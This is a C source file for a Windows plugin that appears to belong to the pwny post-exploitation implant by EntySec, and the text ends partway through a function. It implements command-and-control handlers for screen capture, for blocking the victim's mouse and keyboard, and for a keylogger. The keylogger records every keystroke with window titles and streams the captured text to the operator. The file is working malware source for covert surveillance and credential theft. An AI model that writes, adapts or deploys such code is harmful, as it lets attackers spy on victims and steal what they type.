/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * UI tab plugin — merged: ui (screenshot) + uictl + keyscan.
 *
 * Handlers:
 *   ui_screenshot  (API_CALL)     — GDI screenshot / stream pipe
 *   uictl_set      (API_CALL + 1) — enable/disable mouse/keyboard
 *   uictl_get      (API_CALL + 2) — query mouse/keyboard state
 *   keyscan_start  (API_CALL + 3) — start keylogger
 *   keyscan_stop   (API_CALL + 4) — stop keylogger
 *   keyscan_dump   (API_CALL + 5) — dump captured keystrokes
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>
#include <pwny/pipe.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ================================================================== */
/* Win32 function pointer types                                        */
/* ================================================================== */

/* gdi32.dll — screenshot */
typedef HDC     (WINAPI *fn_CreateCompatibleDC)(HDC);
typedef BOOL    (WINAPI *fn_DeleteDC)(HDC);
typedef HBITMAP (WINAPI *fn_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ (WINAPI *fn_SelectObject)(HDC, HGDIOBJ);
typedef BOOL    (WINAPI *fn_DeleteObject)(HGDIOBJ);
typedef BOOL    (WINAPI *fn_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int     (WINAPI *fn_GetDeviceCaps)(HDC, int);
typedef int     (WINAPI *fn_GetObjectA)(HANDLE, int, LPVOID);
typedef int     (WINAPI *fn_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID,
                                        LPBITMAPINFO, UINT);

/* user32.dll — screenshot + uictl + keyscan */
typedef HDC     (WINAPI *fn_GetDC)(HWND);
typedef int     (WINAPI *fn_ReleaseDC)(HWND, HDC);
typedef int     (WINAPI *fn_GetSystemMetrics)(int);
typedef HHOOK   (WINAPI *fn_SetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL    (WINAPI *fn_UnhookWindowsHookEx)(HHOOK);
typedef LRESULT (WINAPI *fn_CallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
typedef BOOL    (WINAPI *fn_GetKeyboardState)(PBYTE);
typedef int     (WINAPI *fn_ToUnicode)(UINT, UINT, const BYTE *, LPWSTR, int, UINT);
typedef BOOL    (WINAPI *fn_GetMessageA)(LPMSG, HWND, UINT, UINT);
typedef BOOL    (WINAPI *fn_PeekMessageA)(LPMSG, HWND, UINT, UINT, UINT);
typedef BOOL    (WINAPI *fn_TranslateMessage)(const MSG *);
typedef LRESULT (WINAPI *fn_DispatchMessageA)(const MSG *);
typedef BOOL    (WINAPI *fn_PostThreadMessageA)(DWORD, UINT, WPARAM, LPARAM);

/* kernel32.dll — screenshot + keyscan */
typedef HGLOBAL (WINAPI *fn_GlobalAlloc)(UINT, SIZE_T);
typedef LPVOID  (WINAPI *fn_GlobalLock)(HGLOBAL);
typedef BOOL    (WINAPI *fn_GlobalUnlock)(HGLOBAL);
typedef HGLOBAL (WINAPI *fn_GlobalFree)(HGLOBAL);
typedef void    (WINAPI *fn_EnterCriticalSection)(LPCRITICAL_SECTION);
typedef void    (WINAPI *fn_LeaveCriticalSection)(LPCRITICAL_SECTION);
typedef void    (WINAPI *fn_InitializeCriticalSection)(LPCRITICAL_SECTION);
typedef void    (WINAPI *fn_DeleteCriticalSection)(LPCRITICAL_SECTION);
typedef int     (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
                                                 LPSTR, int, LPCCH, LPBOOL);
typedef HANDLE  (WINAPI *fn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                          LPTHREAD_START_ROUTINE, LPVOID,
                                          DWORD, LPDWORD);
typedef DWORD   (WINAPI *fn_GetThreadId)(HANDLE);
typedef DWORD   (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
typedef void    (WINAPI *fn_Sleep)(DWORD);
typedef DWORD   (WINAPI *fn_GetLastError)(void);
typedef HANDLE  (WINAPI *fn_CreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef BOOL    (WINAPI *fn_SetEvent)(HANDLE);


/* user32.dll — keyscan window tracking */
typedef HWND    (WINAPI *fn_GetForegroundWindow)(void);
typedef int     (WINAPI *fn_GetWindowTextA)(HWND, LPSTR, int);

/* msvcrt.dll — keyscan */
typedef int     (__cdecl *fn__snprintf)(char *, size_t, const char *, ...);

/* ================================================================== */
/* Unified resolved-pointer struct                                     */
/* ================================================================== */

static struct
{
    /* gdi32.dll — screenshot */
    fn_CreateCompatibleDC      pCreateCompatibleDC;
    fn_DeleteDC                pDeleteDC;
    fn_CreateCompatibleBitmap  pCreateCompatibleBitmap;
    fn_SelectObject            pSelectObject;
    fn_DeleteObject            pDeleteObject;
    fn_BitBlt                  pBitBlt;
    fn_GetDeviceCaps           pGetDeviceCaps;
    fn_GetObjectA              pGetObjectA;
    fn_GetDIBits               pGetDIBits;

    /* user32.dll — screenshot */
    fn_GetDC                   pGetDC;
    fn_ReleaseDC               pReleaseDC;
    fn_GetSystemMetrics        pGetSystemMetrics;

    /* user32.dll — uictl + keyscan (shared) */
    fn_SetWindowsHookExA       pSetWindowsHookExA;
    fn_UnhookWindowsHookEx     pUnhookWindowsHookEx;
    fn_CallNextHookEx          pCallNextHookEx;

    /* user32.dll — keyscan */
    fn_GetKeyboardState        pGetKeyboardState;
    fn_ToUnicode               pToUnicode;
    fn_GetMessageA             pGetMessageA;
    fn_PeekMessageA            pPeekMessageA;
    fn_TranslateMessage        pTranslateMessage;
    fn_DispatchMessageA        pDispatchMessageA;
    fn_PostThreadMessageA      pPostThreadMessageA;

    /* kernel32.dll — screenshot */
    fn_GlobalAlloc             pGlobalAlloc;
    fn_GlobalLock              pGlobalLock;
    fn_GlobalUnlock            pGlobalUnlock;
    fn_GlobalFree              pGlobalFree;

    /* kernel32.dll — keyscan */
    fn_EnterCriticalSection      pEnterCriticalSection;
    fn_LeaveCriticalSection      pLeaveCriticalSection;
    fn_InitializeCriticalSection pInitializeCriticalSection;
    fn_DeleteCriticalSection     pDeleteCriticalSection;
    fn_WideCharToMultiByte       pWideCharToMultiByte;
    fn_CreateThread              pCreateThread;
    fn_GetThreadId               pGetThreadId;
    fn_WaitForSingleObject       pWaitForSingleObject;
    fn_CloseHandle               pCloseHandle;
    fn_Sleep                     pSleep;
    fn_GetLastError              pGetLastError;
    fn_CreateEventA              pCreateEventA;
    fn_SetEvent                  pSetEvent;


    /* user32.dll — keyscan window tracking */
    fn_GetForegroundWindow       pGetForegroundWindow;
    fn_GetWindowTextA            pGetWindowTextA;

    /* msvcrt.dll — keyscan */
    fn__snprintf                 p_snprintf;
} w;

/* ================================================================== */
/* Tag / type definitions                                              */
/* ================================================================== */

/* --- ui_screenshot --- */
#define UI_SCREENSHOT \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL)

#define UI_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, TAB_BASE, PIPE_TYPE)

/* --- uictl --- */
#define UICTL_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

#define UICTL_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

#define TLV_TYPE_UICTL_DEVICE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)

#define TLV_TYPE_UICTL_ENABLE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)

#define UICTL_MOUSE    0
#define UICTL_KEYBOARD 1
#define UICTL_ALL      2

/* --- keyscan --- */
#define KEYSCAN_START \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 3)

#define KEYSCAN_STOP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 4)

#define KEYSCAN_DUMP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 5)

#define TLV_TYPE_KEYSCAN_DATA \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)

/* Streaming keyscan pipe */
#define KEYSCAN_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, TAB_BASE, PIPE_TYPE + 1)

/* ================================================================== */
/* Handler 1: ui_screenshot (from ui.c)                                */
/* ================================================================== */

static int bmp_to_buffer(HBITMAP hBitmap, HDC hDC,
                         unsigned char **out, size_t *out_size)
{
    BITMAP bmp;
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    DWORD dwBmpSize;
    HGLOBAL hDIB;
    char *lpbitmap;

    w.pGetObjectA(hBitmap, sizeof(BITMAP), &bmp);

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;

    hDIB = w.pGlobalAlloc(GHND, dwBmpSize);
    if (hDIB == NULL)
        return -1;

    lpbitmap = (char *)w.pGlobalLock(hDIB);
    w.pGetDIBits(hDC, hBitmap, 0, (UINT)bmp.bmHeight,
                 lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;

    *out_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    *out = (unsigned char *)malloc(*out_size);

    if (*out == NULL)
    {
        w.pGlobalUnlock(hDIB);
        w.pGlobalFree(hDIB);
        return -1;
    }

    memcpy(*out, &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(*out + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    memcpy(*out + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER),
           lpbitmap, dwBmpSize);

    w.pGlobalUnlock(hDIB);
    w.pGlobalFree(hDIB);

    return 0;
}

static int capture_screen(unsigned char **out_data, size_t *out_size)
{
    HDC hScreenDC;
    HDC hMemoryDC;
    HBITMAP hBitmap;
    HBITMAP hOldBitmap;
    int width, height;

    hScreenDC = w.pGetDC(NULL);
    if (hScreenDC == NULL)
        return -1;

    hMemoryDC = w.pCreateCompatibleDC(hScreenDC);
    if (hMemoryDC == NULL)
    {
        w.pReleaseDC(NULL, hScreenDC);
        return -1;
    }

    width = w.pGetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = w.pGetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (width == 0 || height == 0)
    {
        width = w.pGetDeviceCaps(hScreenDC, HORZRES);
        height = w.pGetDeviceCaps(hScreenDC, VERTRES);
    }

    hBitmap = w.pCreateCompatibleBitmap(hScreenDC, width, height);
    if (hBitmap == NULL)
    {
        w.pDeleteDC(hMemoryDC);
        w.pReleaseDC(NULL, hScreenDC);
        return -1;
    }

    hOldBitmap = (HBITMAP)w.pSelectObject(hMemoryDC, hBitmap);
    w.pBitBlt(hMemoryDC, 0, 0, width, height,
              hScreenDC,
              w.pGetSystemMetrics(SM_XVIRTUALSCREEN),
              w.pGetSystemMetrics(SM_YVIRTUALSCREEN),
              SRCCOPY);
    w.pSelectObject(hMemoryDC, hOldBitmap);

    *out_data = NULL;
    *out_size = 0;

    if (bmp_to_buffer(hBitmap, hMemoryDC, out_data, out_size) != 0
        || *out_data == NULL)
    {
        w.pDeleteObject(hBitmap);
        w.pDeleteDC(hMemoryDC);
        w.pReleaseDC(NULL, hScreenDC);
        return -1;
    }

    w.pDeleteObject(hBitmap);
    w.pDeleteDC(hMemoryDC);
    w.pReleaseDC(NULL, hScreenDC);
    return 0;
}

static tlv_pkt_t *ui_screenshot(c2_t *c2)
{
    unsigned char *bmp_data;
    size_t bmp_size;
    tlv_pkt_t *result;

    if (capture_screen(&bmp_data, &bmp_size) == 0)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, bmp_data, bmp_size);
        free(bmp_data);
    }
    else
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return result;
}

/* Pipe callbacks */

static int ui_pipe_create(pipe_t *pipe, c2_t *c2)
{
    pipe->data = NULL;
    return 0;
}

static int ui_pipe_readall(pipe_t *pipe, void **buffer)
{
    unsigned char *bmp_data;
    size_t bmp_size;

    if (capture_screen(&bmp_data, &bmp_size) != 0)
        return -1;

    *buffer = bmp_data;
    return (int)bmp_size;
}

static int ui_pipe_destroy(pipe_t *pipe, c2_t *c2)
{
    return 0;
}

/* ================================================================== */
/* Handler 2-3: uictl_set / uictl_get (from uictl.c)                  */
/*                                                                     */
/* WH_MOUSE_LL / WH_KEYBOARD_LL hooks require the installing thread   */
/* to run a message pump.  All hook operations are dispatched to a     */
/* dedicated uictl thread via PostThreadMessageA.  An auto-reset      */
/* event synchronises the caller so uictl_set can return success/fail. */
/* ================================================================== */

static HHOOK  hMouseHook    = NULL;
static HHOOK  hKeyboardHook = NULL;

/* Hook thread state */
static HANDLE uictl_thread       = NULL;
static DWORD  uictl_thread_id    = 0;
static HANDLE uictl_done_event   = NULL;
static volatile int uictl_result = 0;

/* Custom thread messages */
#define WM_UICTL_DISABLE_MOUSE    (WM_USER + 200)
#define WM_UICTL_ENABLE_MOUSE     (WM_USER + 201)
#define WM_UICTL_DISABLE_KEYBOARD (WM_USER + 202)
#define WM_UICTL_ENABLE_KEYBOARD  (WM_USER + 203)

static LRESULT CALLBACK uictl_mouse_hook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        return 1;
    }

    return w.pCallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

static LRESULT CALLBACK uictl_keyboard_hook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        return 1;
    }

    return w.pCallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

/* These are only called on the uictl hook thread */

static int uictl_disable_mouse_impl(void)
{
    if (hMouseHook != NULL)
        return 0;

    hMouseHook = w.pSetWindowsHookExA(WH_MOUSE_LL, uictl_mouse_hook,
                                      cot_hModule, 0);
    return (hMouseHook != NULL) ? 0 : -1;
}

static int uictl_enable_mouse_impl(void)
{
    if (hMouseHook == NULL)
        return 0;

    if (w.pUnhookWindowsHookEx(hMouseHook))
    {
        hMouseHook = NULL;
        return 0;
    }
    return -1;
}

static int uictl_disable_keyboard_impl(void)
{
    if (hKeyboardHook != NULL)
        return 0;

    hKeyboardHook = w.pSetWindowsHookExA(WH_KEYBOARD_LL, uictl_keyboard_hook,
                                         cot_hModule, 0);
    return (hKeyboardHook != NULL) ? 0 : -1;
}

static int uictl_enable_keyboard_impl(void)
{
    if (hKeyboardHook == NULL)
        return 0;

    if (w.pUnhookWindowsHookEx(hKeyboardHook))
    {
        hKeyboardHook = NULL;
        return 0;
    }
    return -1;
}

static DWORD WINAPI uictl_thread_proc(LPVOID param)
{
    MSG msg;

    (void)param;

    /* Force message queue creation before signalling readiness */
    w.pPeekMessageA(&msg, NULL, 0, 0, PM_NOREMOVE);

    /* Signal caller that the thread is ready to receive messages */
    w.pSetEvent(uictl_done_event);

    while (w.pGetMessageA(&msg, NULL, 0, 0) > 0)
    {
        switch (msg.message)
        {
            case WM_UICTL_DISABLE_MOUSE:
                uictl_result = uictl_disable_mouse_impl();
                w.pSetEvent(uictl_done_event);
                break;

            case WM_UICTL_ENABLE_MOUSE:
                uictl_result = uictl_enable_mouse_impl();
                w.pSetEvent(uictl_done_event);
                break;

            case WM_UICTL_DISABLE_KEYBOARD:
                uictl_result = uictl_disable_keyboard_impl();
                w.pSetEvent(uictl_done_event);
                break;

            case WM_UICTL_ENABLE_KEYBOARD:
                uictl_result = uictl_enable_keyboard_impl();
                w.pSetEvent(uictl_done_event);
                break;

            default:
                w.pTranslateMessage(&msg);
                w.pDispatchMessageA(&msg);
                break;
        }
    }

    /* Clean up hooks before exiting */
    if (hMouseHook)
    {
        w.pUnhookWindowsHookEx(hMouseHook);
        hMouseHook = NULL;
    }

    if (hKeyboardHook)
    {
        w.pUnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
    }

    return 0;
}

static int uictl_ensure_thread(void)
{
    if (uictl_thread != NULL)
        return 0;

    /* Auto-reset event: resets after each successful Wait */
    uictl_done_event = w.pCreateEventA(NULL, FALSE, FALSE, NULL);
    if (uictl_done_event == NULL)
        return -1;

    uictl_thread = w.pCreateThread(NULL, 0, uictl_thread_proc,
                                   NULL, 0, &uictl_thread_id);
    if (uictl_thread == NULL)
    {
        w.pCloseHandle(uictl_done_event);
        uictl_done_event = NULL;
        return -1;
    }

    /* Wait for the thread's message queue to be ready */
    w.pWaitForSingleObject(uictl_done_event, 2000);
    return 0;
}

/* Post a command to the hook thread and wait for the result */
static int uictl_post_and_wait(UINT msg)
{
    if (uictl_ensure_thread() != 0)
        return -1;

    uictl_result = -1;
    w.pPostThreadMessageA(uictl_thread_id, msg, 0, 0);
    w.pWaitForSingleObject(uictl_done_event, 5000);
    return uictl_result;
}

static tlv_pkt_t *uictl_set(c2_t *c2)
{
    int device;
    int enable;
    int result;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_UICTL_DEVICE, &device) < 0 ||
        tlv_pkt_get_u32(c2->request, TLV_TYPE_UICTL_ENABLE, &enable) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    result = 0;

    switch (device)
    {
        case UICTL_MOUSE:
            result = uictl_post_and_wait(enable ? WM_UICTL_ENABLE_MOUSE
                                                : WM_UICTL_DISABLE_MOUSE);
            break;

        case UICTL_KEYBOARD:
            result = uictl_post_and_wait(enable ? WM_UICTL_ENABLE_KEYBOARD
                                                : WM_UICTL_DISABLE_KEYBOARD);
            break;

        case UICTL_ALL:
            result = uictl_post_and_wait(enable ? WM_UICTL_ENABLE_MOUSE
                                                : WM_UICTL_DISABLE_MOUSE);
            if (result == 0)
            {
                result = uictl_post_and_wait(enable ? WM_UICTL_ENABLE_KEYBOARD
                                                    : WM_UICTL_DISABLE_KEYBOARD);
            }
            break;

        default:
            return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    if (result == -1)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *uictl_get(c2_t *c2)
{
    int device;
    int enabled;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_UICTL_DEVICE, &device) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    switch (device)
    {
        case UICTL_MOUSE:
            enabled = (hMouseHook == NULL) ? 1 : 0;
            break;

        case UICTL_KEYBOARD:
            enabled = (hKeyboardHook == NULL) ? 1 : 0;
            break;

        default:
            return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    {
        tlv_pkt_t *result;

        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_u32(result, TLV_TYPE_UICTL_DEVICE, device);
        tlv_pkt_add_u32(result, TLV_TYPE_UICTL_ENABLE, enabled);

        return result;
    }
}

/* ================================================================== */
/* Handler 4-6: keyscan_start / stop / dump (from keyscan.c)           */
/* ================================================================== */

#define KEYSCAN_BUF_SIZE 65536

static HHOOK keyscan_hook = NULL;
static HANDLE keyscan_thread = NULL;
static char keyscan_buffer[KEYSCAN_BUF_SIZE];
static volatile LONG keyscan_offset = 0;
static CRITICAL_SECTION keyscan_cs;
static volatile int keyscan_running = 0;

/* Active keyscan pipe for push-based event delivery */
static pipe_t *keyscan_active_pipe = NULL;

/* ---- Coalescing push buffer ----
 * Instead of sending one TLV packet per keystroke, keystrokes are
 * accumulated in a small push buffer.  A dedicated flush thread
 * wakes every KEYSCAN_FLUSH_MS and sends whatever has accumulated
 * as a single packet.  This reduces packet volume by ~5-10x during
 * active typing while keeping latency under 250ms. */

#define KEYSCAN_PUSH_SIZE  4096
#define KEYSCAN_FLUSH_MS   250

static char keyscan_push_buf[KEYSCAN_PUSH_SIZE];
static volatile LONG keyscan_push_len = 0;
static HANDLE keyscan_flush_thread = NULL;

static void keyscan_flush_push_buf(void)
{
    char local[KEYSCAN_PUSH_SIZE];
    LONG len;

    w.pEnterCriticalSection(&keyscan_cs);
    len = keyscan_push_len;

    if (len > 0)
    {
        memcpy(local, keyscan_push_buf, len);
        keyscan_push_len = 0;
    }

    w.pLeaveCriticalSection(&keyscan_cs);

    if (len > 0 && keyscan_active_pipe != NULL &&
        keyscan_active_pipe->c2 != NULL)
    {
        tlv_pkt_t *pkt = api_craft_tlv_pkt(API_CALL_SUCCESS, NULL);
        tlv_pkt_add_u32(pkt, TLV_TYPE_PIPE_TYPE, KEYSCAN_PIPE);
        tlv_pkt_add_u32(pkt, TLV_TYPE_PIPE_ID, keyscan_active_pipe->id);
        tlv_pkt_add_bytes(pkt, TLV_TYPE_PIPE_BUFFER,
                          (unsigned char *)local, len);
        c2_enqueue_tlv(keyscan_active_pipe->c2, pkt);
        tlv_pkt_destroy(pkt);
    }
}

static DWORD WINAPI keyscan_flush_proc(LPVOID param)
{
    (void)param;

    while (keyscan_running)
    {
        w.pSleep(KEYSCAN_FLUSH_MS);
        keyscan_flush_push_buf();
    }

    /* Final flush — send any remaining buffered keystrokes */
    keyscan_flush_push_buf();
    return 0;
}

static void keyscan_append(const char *text)
{
    size_t len = strlen(text);
    int push_full = 0;

    w.pEnterCriticalSection(&keyscan_cs);

    /* Buffer for dump command */
    if (keyscan_offset + len < KEYSCAN_BUF_SIZE - 1)
    {
        memcpy(keyscan_buffer + keyscan_offset, text, len);
        keyscan_offset += (LONG)len;
        keyscan_buffer[keyscan_offset] = '\0';
    }

    /* Coalescing push buffer for pipe events */
    if (keyscan_active_pipe != NULL)
    {
        if (keyscan_push_len + (LONG)len < KEYSCAN_PUSH_SIZE - 1)
        {
            memcpy(keyscan_push_buf + keyscan_push_len, text, len);
            keyscan_push_len += (LONG)len;
        }
        else
        {
            push_full = 1;
        }
    }

    w.pLeaveCriticalSection(&keyscan_cs);

    /* If push buffer is nearly full, flush immediately */
    if (push_full)
    {
        keyscan_flush_push_buf();
    }
}

/* Track last-seen foreground window for window-title annotations */
static HWND keyscan_last_hwnd = NULL;

static LRESULT CALLBACK keyscan_ll_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        BYTE keyState[256];
        WCHAR unicodeChar[4];
        char utf8[16];
        int ret;

        /* Track foreground window changes */
        {
            HWND fg = w.pGetForegroundWindow();

            if (fg != NULL && fg != keyscan_last_hwnd)
            {
                char title[256];
                int tlen;

                keyscan_last_hwnd = fg;
                tlen = w.pGetWindowTextA(fg, title, sizeof(title) - 1);

                if (tlen > 0)
                {
                    char marker[300];
                    title[tlen] = '\0';
                    w.p_snprintf(marker, sizeof(marker), "\n[%s]\n", title);
                    keyscan_append(marker);
                }
            }
        }

        memset(keyState, 0, sizeof(keyState));
        w.pGetKeyboardState(keyState);

        /* Handle special keys */
        switch (kb->vkCode)
        {
            case VK_RETURN:  keyscan_append("<CR>"); goto done;
            case VK_TAB:     keyscan_append("<Tab>"); goto done;
            case VK_BACK:    keyscan_append("<BS>"); goto done;
            case VK_ESCAPE:  keyscan_append("<Esc>"); goto done;
            case VK_DELETE:  keyscan_append("<Del>"); goto done;
            case VK_INSERT:  keyscan_append("<Ins>"); goto done;
            case VK_LEFT:    keyscan_append("<Left>"); goto done;
            case VK_RIGHT:   keyscan_append("<Right>"); goto done;
            case VK_UP:      keyscan_append("<Up>"); goto done;
            case VK_DOWN:    keyscan_append("<Down>"); goto done;
            case VK_HOME:    keyscan_append("<Home>"); goto done;
            case VK_END:     keyscan_append("<End>"); goto done;
            case VK_PRIOR:   keyscan_append("<PgUp>"); goto done;
            case VK_NEXT:    keyscan_append("<PgDn>"); goto done;
            case VK_LWIN:
            case VK_RWIN:    keyscan_append("<Win>"); goto done;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
            case VK_MENU:
            case VK_LMENU:
            case VK_RMENU:
            case VK_CAPITAL:
                goto done; /* Skip modifier-only presses */
        }

        /* Handle F-keys */
        if (kb->vkCode >= VK_F1 && kb->vkCode <= VK_F24)
        {
            char fkey[8];
            w.p_snprintf(fkey, sizeof(fkey), "<F%d>", kb->vkCode - VK_F1 + 1);
            keyscan_append(fkey);
            goto done;
        }

        /* Convert to Unicode character */
        ret = w.pToUnicode(kb->vkCode, kb->scanCode, keyState, unicodeChar,
                           sizeof(unicodeChar) / sizeof(WCHAR), 0);
        if (ret > 0)
        {
            int utf8_len = w.pWideCharToMultiByte(CP_UTF8, 0, unicodeChar, ret,
                                                  utf8, sizeof(utf8) - 1,
                                                  NULL, NULL);
            if (utf8_len > 0)
            {
                utf8[utf8_len] = '\0';
                keyscan_append(utf8);
            }
        }
    }

done:
    return w.pCallNextHookEx(keyscan_hook, nCode, wParam, lParam);
}

static DWORD WINAPI keyscan_thread_proc(LPVOID param)
{
    MSG msg;

    (void)param;

    keyscan_hook = w.pSetWindowsHookExA(WH_KEYBOARD_LL, keyscan_ll_proc, NULL, 0);
    if (keyscan_hook == NULL)
    {
        log_debug("* SetWindowsHookEx failed (%lu)\n", w.pGetLastError());
        return 1;
    }

    keyscan_running = 1;

    while (w.pGetMessageA(&msg, NULL, 0, 0) > 0)
    {
        w.pTranslateMessage(&msg);
        w.pDispatchMessageA(&msg);
    }

    return 0;
}

static void keyscan_ensure_running(void)
{
    if (keyscan_running)
    {
        return;
    }

    w.pInitializeCriticalSection(&keyscan_cs);
    keyscan_offset = 0;
    keyscan_last_hwnd = NULL;
    memset(keyscan_buffer, 0, KEYSCAN_BUF_SIZE);

    keyscan_thread = w.pCreateThread(NULL, 0, keyscan_thread_proc, NULL, 0, NULL);
    if (keyscan_thread == NULL)
    {
        w.pDeleteCriticalSection(&keyscan_cs);
        return;
    }

    w.pSleep(100);

    if (!keyscan_running)
    {
        w.pWaitForSingleObject(keyscan_thread, 1000);
        w.pCloseHandle(keyscan_thread);
        keyscan_thread = NULL;
        w.pDeleteCriticalSection(&keyscan_cs);
    }
}

static void keyscan_ensure_stopped(void)
{
    if (!keyscan_running)
    {
        return;
    }

    keyscan_running = 0;

    if (keyscan_hook)
    {
        w.pUnhookWindowsHookEx(keyscan_hook);
        keyscan_hook = NULL;
    }

    if (keyscan_thread)
    {
        w.pPostThreadMessageA(w.pGetThreadId(keyscan_thread), WM_QUIT, 0, 0);
        w.pWaitForSingleObject(keyscan_thread, 5000);
        w.pCloseHandle(keyscan_thread);
        keyscan_thread = NULL;
    }

    /* NOTE: caller is responsible for DeleteCriticalSection
     * after all users (flush thread, etc.) have stopped. */
}

static tlv_pkt_t *keyscan_start(c2_t *c2)
{
    keyscan_ensure_running();

    if (!keyscan_running)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *keyscan_stop(c2_t *c2)
{
    keyscan_ensure_stopped();
    w.pDeleteCriticalSection(&keyscan_cs);
    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *keyscan_dump(c2_t *c2)
{
    tlv_pkt_t *result;

    if (!keyscan_running)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pEnterCriticalSection(&keyscan_cs);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_string(result, TLV_TYPE_KEYSCAN_DATA, keyscan_buffer);

    keyscan_offset = 0;
    memset(keyscan_buffer, 0, KEYSCAN_BUF_SIZE);

    w.pLeaveCriticalSection(&keyscan_cs);
